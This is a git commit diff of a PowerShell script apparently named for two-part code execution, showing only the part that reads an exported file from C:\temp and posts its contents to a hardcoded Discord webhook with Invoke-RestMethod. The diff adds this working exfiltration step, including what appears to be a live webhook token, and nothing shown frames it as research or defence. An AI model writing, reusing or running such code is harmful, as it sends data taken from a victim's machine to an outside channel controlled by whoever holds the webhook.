4a7b43bc36ac77984c5544ce6d4e80f2b72f8a78
2jeg <nick.kaza1337@gmail.com>
2025-02-03 01:08:34 +1100

    Update 2partcodeexec (1).ps1

--- 2partcodeexec (1).ps1
+++ 2partcodeexec (1).ps1
@@ -49,9 +49,10 @@ $savePath = "C:\temp\export.htm"
 Start-Sleep -Seconds 3
 
 if (Test-Path $filePath) {
-$webhookUrl = "https://discord.com/api/webhooks/1333404978911510651/FVr2hApcOYlBDhSDad7s0Zr_kCIts4bBRz9OjYXOVsHH-uaY3nR3fNqP0bQ7lQSOGbRX"
-$body = @{
-    file1 = Get-Content -Path 'export.htm' -Raw
-}
+    $webhookUrl = "https://discord.com/api/webhooks/1333404978911510651/FVr2hApcOYlBDhSDad7s0Zr_kCIts4bBRz9OjYXOVsHH-uaY3nR3fNqP0bQ7lQSOGbRX"
+    $body = @{
+        file1 = Get-Content -Path $filePath -Raw
+    }
 
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body
+}
